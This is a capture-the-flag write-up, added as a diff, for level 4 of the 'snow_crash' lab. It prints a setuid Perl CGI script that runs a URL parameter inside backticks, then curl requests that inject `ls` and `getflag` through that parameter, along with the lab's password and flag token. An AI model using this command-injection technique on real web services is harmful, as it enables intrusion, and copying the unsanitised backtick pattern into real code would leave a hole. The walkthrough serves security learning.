@@ -1,0 +1,32 @@
+Level04 - snow_crash
+
+Connect with the previous password "qi0maab88jeaj46qoumi7maus"
+	ssh -p 4242 level04@192.168.1.20 
+
+In the folder you fild a level04.pl file, it have the setuid control bit set.
+when we cat it we got : 
+
+	#!/usr/bin/perl
+	# localhost:4747 						# we can guest that we have a server listen to this port
+	use CGI qw{param}; 						# tell to use CGI with the 
+	print "Content-type: text/html\n\n";
+	sub x {									# this is a subroutine, it like a declaration of function
+	  $y = $_[0];							# get first argument that is "x"
+	  print `echo $y 2>&1`;					
+	}
+	x(param("x")); 							# get the param of x from the url
+
+if we place a x with a ls inside we get the same file, so we can execute command at this port 
+	curl 'localhost:4747/level04.pl?x=`ls`'
+
+do this give us the flag 
+	curl 'localhost:4747/level04.pl?x=`getflag`'
+
+Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
+
+
+
+
+https://docstore.mik.ua/orelly/perl/learn32/ch18_04.htm
+https://perldoc.perl.org/perlsub
+
